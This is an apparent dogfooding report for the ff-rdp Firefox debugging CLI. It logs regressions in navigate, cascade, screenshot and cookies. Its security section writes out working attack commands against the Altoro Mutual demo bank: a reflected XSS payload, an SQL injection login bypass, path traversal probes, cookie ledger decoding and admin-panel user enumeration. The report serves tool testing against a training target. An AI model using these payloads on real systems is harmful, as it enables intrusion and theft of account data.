---
title: Dogfooding Session 54 — iter-79/80/81 verification on tennis-sepp.ch + Altoro security challenges
type: dogfooding
date: 2026-05-26
status: completed
site: https://tennis-sepp.ch, https://demo.testfire.net
commands_tested: [doctor, launch, tabs, navigate, eval, page-text, dom, console, network, perf, screenshot, click, type, wait, cookies, storage, a11y, reload, back, forward, inspect, sources, snapshot, geometry, responsive, computed, styles, cascade, scroll]
tags: [dogfooding, iter-79, iter-80, iter-81, security-audit, altoro-mutual, regression-verification]
---

# Dogfooding Session 54

Verified iter-79/80/81 fixes on the user's own tennis-sepp.ch memorial site, then
re-ran the Altoro Mutual security audit from [[dogfooding-session-51]] against
the same commands. Two showstoppers: **iter-79's navigate readiness fix never
landed for the real-site path** (every `navigate` times out at the default 10s
even though the page actually loads), and **iter-81's `cascade` command returns
empty rules + null computed on every selector** — the flagship feature of the
iteration does not work. iter-80's ergonomics bundle (help groups, `reload --hard`,
`eval --unwrap`, `dom --include-style`, `a11y --critical`) all work as advertised.

## What's New Since Last Session

| iter | Feature | Visible | Works |
|------|---------|---------|-------|
| 79   | navigate readiness fix (dom-complete/interactive) | n/a | ❌ |
| 79   | `dom --help` mentions `styles` / `computed` | ✅ | ✅ |
| 80   | top-level help groups (Inspect / Navigate / Trace / Lifecycle) | ✅ | ✅ |
| 80   | `reload --hard` (Firefox `options.force`) | ✅ | ✅ |
| 80   | `eval --unwrap` (parse JSON-encoded string results) | ✅ | ✅ |
| 80   | `dom --include-style PROPS` | ✅ | ✅ |
| 80   | `a11y --critical` | ✅ | ✅ |
| 81   | `cascade` subcommand (explain why a CSS property wins) | ✅ | ❌ |

## Stale-binary trap

`~/.cargo/bin/ff-rdp` was a May-25 build that predated iter-79/80/81 merges, even
though the merges landed earlier today. First half of the session ran against
the stale binary; reinstalled with `cargo install --path crates/ff-rdp-cli`
and retried. **Feature gap**: `ff-rdp --version` reports `0.2.0` for both the
stale and fresh builds — the version string did not change across three merged
iterations. Consider embedding the git short-sha (or a build-date) so `--version`
can disambiguate stale installs.

## Regression Checks

| Item                                                      | Status | Notes |
|-----------------------------------------------------------|--------|-------|
| navigate timeout on tennis-sepp.ch (iter-79 Theme A)      | ❌ regression | Default `--wait complete` AND `--wait interactive` time out at 10s and 30s on `https://tennis-sepp.ch`. `--no-wait` + `wait --eval` confirms `document.readyState=="complete"` within ~3s, so the page IS loading — the document-event subscription/replay path that iter-79 touched still misses the event. Reproduces on `https://example.com` too (every navigate against a different origin hangs to the timeout). |
| `dom --help` mentions `styles`/`computed` (iter-79 Theme B)| ✅ pass | Both `ff-rdp styles <SEL>` and `ff-rdp computed <SEL>` callouts appear in the dom subcommand help. |
| Screenshot on Firefox 151                                 | ❌ regression | `screenshot: screenshot actor unavailable on Firefox 151; minimum supported version: 120`. Both `screenshot -o` and `screenshot --full-page`. iter-77/iter-78 added a ScreenshotArgsExt shim + live tests; one of them regressed. Compounded by the error message itself being **misleading** — it phrases the gap as "minimum supported 120" when Firefox is *newer* than 120; clearly the actor or the discovery probe is what's failing, not a version-floor check. |

## Smoke Test Results

| Command | Status | Notes |
|---------|--------|-------|
| `doctor` | ✅ | All checks pass, FF 151 detected |
| `tabs` | ✅ | |
| `navigate --no-wait` | ✅ | works around iter-79 regression |
| `eval` (+ `--stringify`, `--unwrap`) | ✅ | `--unwrap` correctly parses JSON-encoded string into structured `results` |
| `page-text` | ✅ | Returned ~8KB of clean innerText from tennis-sepp.ch |
| `dom` (default, `--include-style`, `--jq`, `--limit`) | ✅ | `--include-style color,font-size` returns a `style` field per match |
| `dom stats` | ✅ | 157 nodes / 1 inline script / 1 render-blocking on tennis-sepp.ch |
| `console --level error` | ✅ (empty) | |
| `network --format text` | ⚠ shape | "Requests by Cause Type" prints a single bare numeric column with no label; `transfer_size: 0` for every entry even on cross-origin loads. |
| `perf vitals` / `summary` / `audit` | ⚠ accuracy | `lcp_ms: 0.0` + `lcp_rating: "good"` is misleading — there *is* a `lcp_note` saying "estimated via DOM approximation; not available from PerformanceObserver in headless Firefox", but emitting `"good"` for an unknown LCP is still wrong. |
| `screenshot` | ❌ | broken on FF 151 (above) |
| `click`, `type`, `wait --eval` | ✅ | drove the Altoro login form end-to-end |
| `cookies` | ❌ | Returns `[]` on Altoro even though `document.cookie` exposes `AltoroAccounts=...`. StorageActor cookies query is missing the live-page jar for non-httpOnly cookies set without an explicit `Domain=` attribute. |
| `storage localStorage` | ✅ (empty) | |
| `a11y --critical`, `a11y contrast --fail-only` | ✅ | tennis-sepp.ch is clean (0 critical, 254/254 contrast pass) |
| `reload --hard --wait-idle` | ✅ | Returns `force: true, reloaded: true, idle_at_ms: 2479, requests_observed: 28` |
| `back` / `forward` | ✅ | |
| `inspect <grip>` | ✅ | `window.location` grip resolves to a Location object with full property list |
| `sources` | ❌ | `fallback_method: "js-eval"`, `results: []` even on Altoro which loads multiple scripts. Long-standing issue (sessions 47+). |
| `snapshot --max-chars 4000` | ✅ | The flag is `--max-chars` not `--max-depth` — first guess from a fresh user landed on `--max-depth` and got an "unexpected argument" error with a useful "tip: a similar argument exists: '--max-chars'" line; the depth-style flag is the natural muscle memory. |
| `geometry` (with overlap detection) | ✅ | |
| `responsive --widths 375,768,1280` | ✅ | Restored original viewport at end |
| `computed --prop A --prop B --prop C` | ✅ | Multi-`--prop` returns a single map per match (was reported broken in sessions 47-49 — looks fixed) |
| `styles --applied` | ⚠ noisy | Returns the same `*, ::after, ::before` user-agent reset rule **three times back-to-back with `properties: []`** before the real cascade entries. Looks like an over-aggressive include of UA rules whose properties were filtered out. |
| `cascade <SEL> --prop X` | ❌ | Returns `{ "computed": null, "rules": [] }` for every selector tried (`h1`, `body`, `#header`, `#logo`). With `--all` returns `total: 0`. **iter-81's flagship feature is non-functional.** |
| `scroll to <SEL>` | ✅ | |

## Security Findings via ff-rdp on demo.testfire.net

Re-ran the [[dogfooding-session-51]] audit. ff-rdp surfaces real vulns
remarkably well — the JSON output composes cleanly into a multi-step probe.

### 🎯 Real vulnerabilities surfaced

1. **Reflected XSS in `/search.jsp?query=`**
   ```sh
   ff-rdp navigate "https://demo.testfire.net/search.jsp?query=<script>document.title='XSS-FIRED'</script>" --no-wait
   ff-rdp eval 'document.title'   # → "XSS-FIRED"
   ```
   Two commands. End-to-end proof.

2. **SQL injection bypass on `/login.jsp`** (`admin' OR '1'='1` / any password)
   ```sh
   ff-rdp type '#uid' "admin' OR '1'='1"
   ff-rdp type '#passw' "anything"
   ff-rdp click 'input[name=btnSubmit]'
   ff-rdp eval --stringify '({url: location.href, title: document.title})'
   # → logged in as "Admin User" at /bank/main.jsp
   ```

3. **Path-info disclosure on `/index.jsp?content=`**
   ```sh
   ff-rdp navigate 'https://demo.testfire.net/index.jsp?content=/WEB-INF/web.xml' --no-wait
   ff-rdp eval 'document.body.innerText'
   # → "Failed due to The requested resource (/static//WEB-INF/web.xml) is not available"
   # leaks the JSP include base path (/static/) and confirms the param is a server-side file path
   ```

4. **500 stack trace leak on path-traversal attempt** (`?content=../../../../etc/passwd`)
   ```
   HTTP Status 500 – Internal Server Error
   ...
   org.apache.jasper.JasperException: java.lang.NullPointerException
       org.apache.jasper.servlet.JspServletWrapper.handleJspException(...)
   ```

5. **Sensitive data in a non-httpOnly cookie** — `AltoroAccounts`
   ```sh
   ff-rdp eval --stringify '(() => {
     const raw = document.cookie.match(/AltoroAccounts="([^"]+)"/)[1];
     return atob(raw).split("|").map(r => { const p = r.split("~"); return {id: p[0], type: p[1], balance: p[2]}; });
   })()'
   ```
   Returns the full list of account IDs, types, and balances **client-side
   from the cookie alone** — the server is round-tripping the whole
   account ledger in a JS-readable cookie. Two of the balances are
   clearly tampered (`2.0E31`, `-3.55e20`) — evidence of parameter
   tampering by a prior visitor.

6. **User enumeration via the admin panel** (reached via the SQLi above)
   ```sh
   ff-rdp eval --stringify 'Array.from(document.querySelectorAll("select option")).map(o => o.value)'
   # → ["admin","jdoe","jsmith","sspeed","tuser", ...]
   ```

### What `ff-rdp` did especially well for security probing

- `eval --unwrap` + `fetch(..., {credentials: "include"})` made REST-API IDOR
  probing a one-liner per endpoint.
- `eval --stringify` returns native JS objects/arrays as JSON — no more
  client-side de-stringification.
- `type` / `click` drove the SQLi login form with zero browser GUI
  interaction needed.
- The first-class JSON output of every command (`--jq` filter, `total`,
  `meta`) composed naturally into scripted enumeration loops.

## New Findings (bugs not in session 53)

### N1. iter-81 `cascade` is non-functional [showstopper]
Every invocation returns `{"computed": null, "rules": []}` regardless of
selector or `--prop`. `--all` returns `total: 0`. Tested against `h1`,
`body`, `#header`, `#logo`. `styles --applied` against the same elements
returns rich rule data, so the page state is fine — the cascade code
path itself isn't reading the matched rules. **iter-81's stated AC
("explain which rule wins") is unmet on real pages.**

### N2. Screenshot regression on Firefox 151 [major]
`screenshot: screenshot actor unavailable on Firefox 151; minimum supported
version: 120`. iter-77/78 supposedly added a ScreenshotArgsExt shim and
live tests; one of them regressed (or the live test doesn't cover the
no-args / `-o` path).

### N3. Misleading error message: "minimum supported version: 120" when FF is *newer* [minor]
The screenshot failure phrases the actor-discovery failure as a
version-floor check, but Firefox 151 ≥ 120. The error message inverts
the actual condition.

### N4. `--version` doesn't change across iter-79/80/81 merges [moderate]
Three merged iterations added user-visible features and `ff-rdp --version`
still says `0.2.0` for both pre- and post-merge builds. Embed git-sha or
build-date so users (and LLMs) can spot a stale install.

### N5. `cookies` command misses JS-readable cookies [moderate]
On Altoro Mutual `cookies` returns `[]` while `document.cookie` returns
the full `AltoroAccounts=...` cookie. StorageActor cookies query
appears to be filtering out cookies that lack `Domain=`/`HttpOnly`/etc.
Security audits NEED to see these.

### N6. `styles --applied` returns duplicate UA-reset stub entries [cosmetic]
First three rules for an `h1` query are all `*, ::after, ::before` with
`properties: []`. Likely a known dup from the StyleSheetActor query;
should be deduped/filtered before returning.

### N7. `perf vitals` reports `lcp_rating: "good"` for `lcp_ms: 0.0` [moderate]
The result includes a `lcp_note` explaining the value is unavailable in
headless, but still emits a `"good"` rating — that misleads agents that
check the rating field. Emit `"unavailable"` / `null` when the metric
wasn't measured.

### N8. `network` text-format "Requests by Cause Type" lacks labels [cosmetic]
Prints `       3` (just a count, no cause-type breakdown).

### N9. `snapshot` flag is `--max-chars` but `--max-depth` is the natural guess [feature gap]
Clap's "tip: similar argument" helped, but a `--depth` knob would match
muscle memory from `dom tree` and from Chrome DevTools Protocol.

## What Works Well

- **iter-80 ergonomics bundle** — top-level help groups, `reload --hard`,
  `eval --unwrap`, `dom --include-style`, `a11y --critical` all work
  immediately on a real site.
- **Composing commands for security probing** — chaining `navigate`,
  `eval`, `type`, `click`, and `eval --unwrap`+`fetch` produces concise,
  scriptable exploit demos.
- **`--no-wait` + `wait --eval` workaround** — even with iter-79
  navigate-readiness broken, the combination remains a clean fallback
  any LLM agent can discover from the error message's "use --no-wait"
  hint.
- **`computed --prop A --prop B --prop C`** (was broken in 47–49) — now
  returns a clean `{color, font-family, font-size}` map per match.

## Feature Gaps (wishlist)

- `cookies --all` flag to include JS-readable cookies via `document.cookie`
  fallback (or fix N5).
- `eval --file <path>` consistency: `cat script.js | ff-rdp eval --stdin`
  works, but a file flag is more LLM-friendly.
- `perf vitals --strict` that errors out if any vital is unmeasured rather
  than emitting `"good"` for a 0.
- `cascade --raw` / `--debug` to dump the underlying StyleRuleActor
  response so we can diagnose N1 without rebuilding.
- `ff-rdp --version` should include git-sha (N4).

## Summary

- ~30 commands tested across two sites.
- iter-80 lands cleanly; iter-81 ships a broken flagship feature; iter-79
  half-lands (Theme B yes, Theme A no).
- ff-rdp continues to be a remarkably effective security-probing tool —
  the SQLi-login → admin-enumerate flow runs in 6 commands.

## References

- [[dogfooding-session-53]] — most recent prior session
- [[dogfooding-session-51]] — original Altoro Mutual security audit
- [[iteration-79-navigate-readiness-and-dom-help-discoverability]]
- [[iteration-80-ff-rdp-ergonomics-bundle]]
- [[iteration-81-cascade-inspector]] — needs follow-up: cascade returns empty
- [[iteration-77-spec-drift-and-windows-reparse-points]] — screenshot shim source
- [[iteration-78-live-screenshot-shim-baseline]] — live tests that should have caught N2
